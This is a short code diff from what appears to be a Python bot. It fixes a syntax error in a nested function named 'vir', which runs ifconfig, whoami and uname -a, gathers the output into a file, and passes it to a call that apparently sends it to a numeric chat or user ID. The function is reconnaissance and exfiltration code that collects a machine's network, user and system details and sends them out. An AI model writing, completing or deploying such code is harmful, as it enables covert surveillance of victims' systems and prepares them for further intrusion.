@@ -6,7 +6,7 @@ def bot():
     def vir():
             os.system(r'ifconfig wlan0>>red.txt')
             os.system(r'whoami>>red.txt')
-            os.system(r'uname -a>>red.txt)
+            os.system(r'uname -a>>red.txt')
             o=open(r'red.txt')
             rik=o.read()
             y(437306907,rik)
